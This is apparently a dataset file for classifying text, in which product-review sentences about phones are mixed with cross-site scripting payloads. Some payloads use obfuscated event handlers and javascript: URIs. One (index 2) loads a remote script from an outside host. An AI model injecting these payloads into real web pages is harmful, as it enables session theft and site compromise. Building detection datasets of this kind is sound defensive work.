index;sentence;;;;;;;;;;;;;;;;;;;;;;;;
0;Does not fit.;;;;;;;;;;;;;;;;;;;;;;;;
1;Unfortunately it will not recharge my iPhone 4s; despite connecting it from multiple power sources (iMac; external battery; wall outlet; etc).;;;;;;;;;;;;;;;;;;;;
2;%22/%3E%3cBODY%20ONloAD=�documenT.WriTE(%22%3cs%22%2b%22CripT%20SRc=http://My.boX.Com/xSs.js%3E%3C/sCRiPT%3e%22)�%3e;;;;;;;;;;;;;;;;;;;;;;;;
3;"<MATH><A XLINK:HREF=""//JSFIDDLE.NET/T846H/"">CLICK";;;;;;;;;;;;;;;;;;;;;;;;
4;<IMG/SRC=`%00` ONERROR=THIS.ONERROR=CONFIRM(1);;;;;;;;;;;;;;;;;;;;;;;;
5;VERY cheap plastic; creaks like an old wooden floor.;;;;;;;;;;;;;;;;;;;;;;;
6;"<FOrm><iFRAme &#09;&#10;&#11; SrC=""JavascRIpt&#58;aleRt(1)""&#11;&#10;&#09;;>";;;;;;;;;;;;;;;;;;;;;;;;
7;"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>";;;;;;;;;;;;;;;;;;;;;;;;
8;"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
9;"<TABLE BACKGROUND=""javascript:alert('XSS')"">";;;;;;;;;;;;;;;;;;;;;;;;
10;The calls drop; the phone comes on and off at will; the screen goes black and the worst of all it stops ringing intermittently.;;;;;;;;;;;;;;;;;;;;;;
11;A pretty good product.;;;;;;;;;;;;;;;;;;;;;;;;
12;Then I had to continue pairing it periodically since it somehow kept dropping.;;;;;;;;;;;;;;;;;;;;;;;;
13;"<FORM><ISINDEX FORMACTION=""JAVASCRIPT&COLON;CONFIRM(1)""";;;;;;;;;;;;;;;;;;;;;;;;
14;Sprint - terrible customer service.;;;;;;;;;;;;;;;;;;;;;;;;
15;I'm happy about this purchase- good quality and low price.;;;;;;;;;;;;;;;;;;;;;;;;
16;"&lt;img style=\""xss&#58;expr/*xss*/ession(alert('xss'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
